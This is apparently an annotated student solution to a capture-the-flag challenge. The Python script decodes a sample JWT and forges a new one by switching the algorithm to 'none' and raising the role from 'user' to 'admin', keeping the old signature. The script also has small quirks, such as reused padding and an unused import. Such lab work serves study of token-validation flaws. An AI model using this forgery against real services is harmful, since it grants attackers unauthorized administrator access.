# ORIGINAL CODE — Token of Trust
# This is your submitted solution. Its program logic is unchanged.
# EXAM TIP: read it top to bottom. Python executes top-level statements immediately.
# Look at solution.py for the reusable, beginner-friendly rewrite.
# Input files for this challenge are in the adjacent data/ folder.

# EXPLAINED: Import a Python library so this script can use its functions.
import base64
import json
from types import new_class

full = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.Ne5rbW9NwVQGK_YEjFdQWZKN1jjD5kL5HjfvFR2Ickc"
parts = full.split(".")

padding = "=" * (-len(parts[0]) % 4)

header = base64.urlsafe_b64decode(parts[0] + padding)
payload = base64.urlsafe_b64decode(parts[1] + padding)

print(header)
print(payload)



payload = {
    "user": "guest",
    "role": "admin"
}
header = {
    "alg":"none",
    "typ":"JWT"
}

encoded_header = base64.urlsafe_b64encode(
    # EXPLAINED: Serialize Python data to JSON. Byte-for-byte format can matter for hashes.
    json.dumps(header, separators=(",", ":")).encode()
).decode().rstrip("=")

encoded_payload = base64.urlsafe_b64encode(
    json.dumps(payload, separators=(",", ":")).encode()
).decode().rstrip("=")

print(encoded_header)
print(encoded_payload)

new = encoded_header + "." + encoded_payload + "." + parts[2]
print(new)